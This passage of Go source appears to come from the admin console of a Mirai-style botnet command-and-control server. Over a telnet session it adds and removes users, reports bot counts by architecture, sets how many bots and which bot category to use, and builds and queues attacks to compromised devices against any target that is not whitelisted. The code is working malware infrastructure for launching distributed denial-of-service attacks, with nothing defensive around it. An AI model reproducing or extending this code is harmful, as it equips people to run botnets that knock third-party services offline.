                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[95m\r\n"))
            }
            continue
        }
		
		if userInfo.admin == 1 && cmd == "/remove" {
            this.conn.Write([]byte("\033[95mUsername: \033[95m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[31mAre You Sure You Want To Remove \033[95m" + rm_un + "?\033[0;31m(\033[0;31my\033[0;31m/\033[1;31mn\033[0;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[31mUser Successfully Removed!\r\n"))
            }
            continue
        }
		
        if userInfo.admin == 1 && cmd == "bots" || cmd == "arch" {
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%d:\t%d\033[31m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[31m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[31m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[95m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
